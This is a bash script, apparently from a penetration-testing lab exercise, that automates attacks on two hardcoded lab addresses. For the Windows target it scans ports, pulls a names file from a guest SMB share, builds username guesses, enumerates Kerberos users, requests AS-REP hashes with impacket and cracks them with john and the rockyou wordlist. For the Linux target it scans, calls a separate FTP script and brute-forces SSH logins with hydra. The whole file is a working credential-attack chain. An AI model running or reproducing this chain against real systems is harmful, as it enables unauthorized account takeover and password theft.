#!/bin/bash

logfolder=/var/log/ytfinal
logfile=/var/log/ytfinal/ytfinal.log # Log folder contains one log file for all tasks completed(ytfinal.log), and one log for each task.

function windowscan
{
	echo "Starting scan, this might take a few minutes..."
	nmap -sS --top-ports 1000 $ip | tee -a $logfile $logfolder/nmapscan.log > /dev/null # Writing the output to a couple of log files.
	echo "Output has been saved to "$logfolder "at " $(date)" "
	echo "...................................................................." >> $logfile # Improving readability in log.
	check=$(grep 445/open $logfolder/nmapscan.log)
	echo "Here are The machines open ports: "
	cat $logfolder/nmapscan.log | grep open
	if [ -n $check ]
	then
	{
		check=$(crackmapexec smb -u 'guest' -p '' --shares $ip | grep -io shared)
		if [ -n $check ]
		then
		{
			echo "Obtaining the names file from the shared folder..."
			echo 'get names.txt' | smbclient -N //$ip/Shared > /dev/null
		}
		else
		{
			echo "Targets shared folder is missing. Aborting---"
			exit 1
		}
		fi
	}
	else
	{
		echo "The targets smb port is down or filtered. Aborting---"
		exit 1
	}
	fi
}

function usernames
{
	sed -i 's/\r//g' names.txt #Removing the carriage return character to prevent messes in the text manipulation process we are about to perform
	echo "" > usernames.lst
	IFS=$'\n'
	for i in $(cat names.txt)
	do
	{
		firstname=$(echo $i | awk '{print $1}')
		lastname=$(echo $i | awk '{print $2}')
		firstletter=$(echo $firstname | cut -b 1)
		secondletter=$(echo $lastname | cut -b 1)
		echo $firstname >> usernames.lst
		echo $lastname >> usernames.lst
		echo $firstname$lastname >> usernames.lst
		echo $lastname$firstname >> usernames.lst
		echo $firstname""$lastname >> usernames.lst
		echo $lastname""$firstname >> usernames.lst
		echo $firstletter""$lastname >> usernames.lst
		echo $secondletter""$firstname >> usernames.lst
	}
	done
}

function passwords
{
	echo "Enumerating users using kerberos"
	nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm=magen,userdb=usernames.lst" $ip | tee -a $logfile $logfolder/user_enum.log > /dev/null
	cat $logfolder/user_enum.log | head -n 10 | tail -n 4
	echo "Output was saved to "$logfolder "at " $(date)" "
	echo "......................................................................" >> $logfile
	grep "@" $logfolder/user_enum.log | awk -F @ '{print $1}' | awk '{print $2}' > knownusers.lst # Clearing the output to focus on the usernames.
	echo "Obtaining hashes from users"
	for i in $(cat knownusers.lst)
	do
	{
		impacket-GetNPUsers magen.local/$i@$ip -request -dc-ip $ip -no-pass -format john | grep krb | tee -a $i.hash
	}
	done
	rm knownusers.lst
	echo "Please wait cracking hashes"
	echo "." > cracked.lst
	for i in $(ls *.hash)
	do
	{
		john --wordlist=/root/rockyou.txt $i | grep '$krb' >> cracked.lst
	}
	done
	echo "Printing passwords:"
	cat cracked.lst
	echo "Passwords were saved to cracked.lst"
	rm names.txt
	rm *.hash
}

function linscan
{
	echo "Starting a tcp scan, this will take a few moments"
	nmap -sS --top-ports 1000 $ip | tee -a $logfile $logfolder/nmapscan.log > /dev/null
	echo "Output was saved to "$logfolder "at " $(date)" "
	echo "......................................................................" >> $logfile
	check=$(grep 21/open $logfolder/nmapscan.log)
	echo "The machines open ports: "
	cat $logfolder/nmapscan.log | grep open
	if [ -n $check ]
	then
	{
		echo "Obtaining files through FTP"
		bash ./autoftp.sh
	}
	else
	{
		echo " Targets ftp port is closed or filtered. Aborting---"
		exit 1
	}
	fi
}

function bruteforce
{
	echo "Starting a bruteforce attack, Please wait."
	echo "Any passwords found, will be printed."
	hydra -L users.txt -P passwords.txt -t 4 ssh://$ip | tee -a $logfile $logfolder/hydra.log > /dev/null
	echo "Output was saved to "$logfolder "at " $(date)" "
	echo "......................................................................" >> $logfile
	cat $logfolder/hydra.log | grep password | grep -v completed
}

function main
{
	if [ -d "$logfolder" ] # Deleting the old logs if there are any so that the new ones can be saved properly.
	then
	{
		rm -rf $logfolder
		mkdir $logfolder
	}
	else
	{
		mkdir $logfolder
	}
	fi
	read -p "Hi ,which machine are you attacking windows or linux? (w/l)  " choice 
	if [ $choice == w ]
	then
	{
		ip=192.168.100.10
		windowscan "$ip"
		usernames
		passwords "$ip"
	}
	elif [ $choice == l ]
	then
	{
		ip=192.168.100.20
		linscan "$ip"
		bruteforce "$ip"
	}
	else
	{
		echo "Invalid choice. Choose w for windows, l for linux."
	}
	fi
}

main
